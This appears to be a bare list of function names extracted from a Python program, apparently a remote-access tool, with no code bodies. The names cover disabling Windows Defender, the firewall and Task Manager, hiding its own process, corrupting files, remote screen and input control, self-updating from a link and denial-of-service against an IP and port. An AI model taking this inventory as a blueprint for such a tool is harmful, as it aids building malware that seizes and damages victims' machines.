addselftosafemode
protect_file
protectfileself
DisableWindowsDefender
EnableWindowsDefender
disableresetoptions
enableresetoptions
add_input_to_shutdown
handle_tostart_sequences
play_tone_fxphone
insend
encrypt
decrypt
send
extract_value
host_ss
send_img
receive_events
client_ss
__init__
run
send_mouse_event
send_key_event
__init__
initUI
exception_hook
stop_streaming
set_image
mousePressEvent
mouseReleaseEvent
mouseMoveEvent
wheelEvent
keyPressEvent
keyReleaseEvent
eventFilter
keyReleaseEvent
eventFilter
restartToUAC
keepalive
terminate_unknown_processes
corruptfile
getchildrenofprocess
add
handle_messages_varyhost
webhandler
decrypt_msg
encrypt
decrypt
encrypt_msg
encrypt
decrypt
handle_connection_of_connected_device
handle_connection
encrypt
decrypt
serverhost
get_script_directory
get_script_filename
get_process_connected_pids
hide_self_executable
restart_explorer
get_username_os
get_random_folder
kill_self
internet_check
reset_network
disablefirewall
enablefirewall
restartToADvancedOptions
disableTaskmanager
enabletaskmgr
runpythonscript
play_tone
play_shepard_tone
check_and_kill_self
corruptfile
autokillunknownprocesses
runcode
onStartup
scan_forvary
wait_on_receive
remote_share
windows_lag_click_sound
win_on_click_play_sound
toggle_win_click_exclamation
send_all_hosts_a_todo
isIn
procKill
SmartAssNoInternet
set_volume
updateselfViaLink
find_file_with_string
handle_update
renameSELF
get_hwnds_for_pid
callback
get_pids_for_process_name
hide_process_via_name
hide_process_via_pid
get_process_name_from_pid
get_parent_process_name_from_pid
get_own_parent_process_pid
freeze_all_processes
unfreeze_all_processes
toggleFreezingAll
restart_self
moveToFolder
toggleSmartAssNoInternet
dosIPPORT
tosend
closedosingthreads
disableUWF
enableUWF
targetOthers
"""